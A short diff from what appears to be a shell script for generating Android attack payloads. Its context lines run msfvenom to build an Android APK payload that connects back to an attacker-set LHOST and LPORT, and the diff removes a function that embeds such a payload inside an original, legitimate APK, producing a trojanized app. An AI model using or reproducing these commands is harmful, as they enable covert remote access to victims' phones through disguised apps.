@@ -271,13 +271,7 @@ function gen_payload()
  spinlong
  msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
 }
-function embed_payload()
-{
- echo -e $yellow ""
- echo "[*] Embeding APK Payload in Orginal APK"
- spinlong
- msfvenom -x $orig -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
-}
+
 #function update apktool
 function up_apktook()
 {
